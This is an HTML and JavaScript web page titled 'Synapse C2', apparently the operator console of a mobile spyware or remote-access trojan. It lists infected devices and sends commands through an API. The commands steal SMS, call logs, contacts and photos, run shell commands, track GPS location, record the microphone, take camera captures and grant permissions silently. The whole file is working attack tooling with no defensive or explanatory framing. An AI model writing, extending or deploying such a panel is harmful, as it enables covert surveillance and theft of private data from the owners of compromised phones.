<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Synapse C2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:monospace;background:#0a0e14;color:#c8d6e5;display:flex;height:100vh}
#sidebar{width:300px;background:#111820;padding:15px;overflow-y:auto;border-right:1px solid #1e2a3a}
#main{flex:1;padding:15px;display:flex;flex-direction:column;gap:10px}
h2{font-size:14px;color:#5a6e82;margin-bottom:8px}
.device{border:1px solid #1e2a3a;padding:10px;margin-bottom:6px;border-radius:4px;cursor:pointer}
.device:hover{border-color:#4da6ff}
.device.sel{border-color:#4da6ff;background:#141f2e}
.dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px}
.on{background:#3cc95b;box-shadow:0 0 6px #3cc95b}
.off{background:#f85149}
.id{font-size:12px;color:#4da6ff;word-break:break-all}
.info{font-size:11px;color:#5a6e82;margin-top:3px}
.btn{background:#1a3a1a;border:1px solid #2ea043;color:#fff;padding:6px 14px;border-radius:4px;cursor:pointer;font-size:12px;font-family:monospace;margin:2px}
.btn:hover{background:#2ea043}
.btn:disabled{opacity:0.3;cursor:not-allowed}
#output{flex:1;background:#0d1117;border:1px solid #1e2a3a;border-radius:4px;padding:10px;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-word}
#toolbar{display:flex;flex-wrap:wrap;gap:4px}
.sep{width:1px;background:#1e2a3a;margin:0 5px}
.stat{font-size:11px;color:#5a6e82;margin-bottom:6px}
</style>
</head>
<body>
<div id="sidebar">
  <h2>↯ DEVICES <span id="devcount">(0)</span></h2>
  <div id="devlist">Connecting...</div>
</div>
<div id="main">
  <div id="toolbar">
    <button class="btn" onclick="cmd('ping','ping')">Ping</button>
    <button class="btn" onclick="cmd('info','gather')">Info</button>
    <button class="btn" onclick="cmd('sms','list','{\"count\":\"10\"}')">SMS</button>
    <button class="btn" onclick="cmd('calls','list','{\"count\":\"20\"}')">Calls</button>
    <button class="btn" onclick="cmd('contacts','list')">Contacts</button>
    <button class="btn" onclick="cmd('files','list','{\"type\":\"images\",\"count\":\"20\"}')">Files</button>
    <button class="btn" onclick="cmd('shell','exec','{\"cmd\":\"id\"}')">Shell</button>
    <button class="btn" onclick="cmd('location','get')">GPS</button>
    <button class="btn" onclick="cmd('mic','record','{\"duration\":\"10\"}')">Mic</button>
    <button class="btn" onclick="cmd('camera','capture')">Camera</button>
    <button class="btn" onclick="cmd('silent_grant','grant')">SilentGrant</button>
  </div>
  <div id="output">Waiting for commands...</div>
</div>

<script>
var activeId = '';
var deviceData = {};

async function fetchDevs(){
  try{
    var r = await fetch('/api/devices');
    var d = await r.json();
    deviceData = {};
    (d.devices||[]).forEach(function(x){deviceData[x.id]=x;});
    renderSidebar();
    if(!activeId || !deviceData[activeId] || !deviceData[activeId].online){
      // auto-select first online
      for(var k in deviceData){
        if(deviceData[k].online){ activeId = k; break; }
      }
    }
    renderSidebar();
  }catch(e){}
}

function renderSidebar(){
  document.getElementById('devcount').textContent = '('+Object.keys(deviceData).length+')';
  var html = '';
  for(var k in deviceData){
    var d = deviceData[k];
    html += '<div class="device'+(k===activeId?' sel':'')+'" onclick="select(\''+k+'\')">';
    html += '<span class="dot '+(d.online?'on':'off')+'"></span>';
    html += '<span class="id">'+k.substring(0,16)+'...</span>';
    html += '<div class="info">'+(d.info.model||'?')+' | SDK '+(d.info.os_version||'?')+' | '+(d.online?'Online':'Offline')+'</div>';
    html += '</div>';
  }
  document.getElementById('devlist').innerHTML = html || 'No devices';
  // disable buttons if no device selected
  var btns = document.querySelectorAll('.btn');
  for(var i=0;i<btns.length;i++) btns[i].disabled = !activeId;
}

function select(id){ activeId = id; renderSidebar(); }

async function cmd(mod, act, params){
  if(!activeId){ alert('No device selected'); return; }
  var p = {};
  if(params) try{p = JSON.parse(params);}catch(e){alert('Bad params');return;}
  document.getElementById('output').textContent = 'Sending '+mod+'/'+act+'...';
  try{
    var r = await fetch('/api/command',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({device_id:activeId, module:mod, action:act, params:p})
    });
    var d = await r.json();
    document.getElementById('output').textContent = 'Queued: '+mod+'/'+act+' ['+(d.command_id||'?')+']\n\nWaiting for result...';
  }catch(e){
    document.getElementById('output').textContent = 'Error: '+e.message;
  }
}

// SSE for results
function sse(){
  var es = new EventSource('/api/events');
  es.onmessage = function(e){
    try{
      var r = JSON.parse(e.data);
      if(!r.data) return;
      document.getElementById('output').textContent = r.data;
    }catch(ex){}
  };
  es.onerror = function(){ setTimeout(sse,2000); };
}

fetchDevs();
setInterval(fetchDevs,3000);
sse();
</script>
</body>
</html>
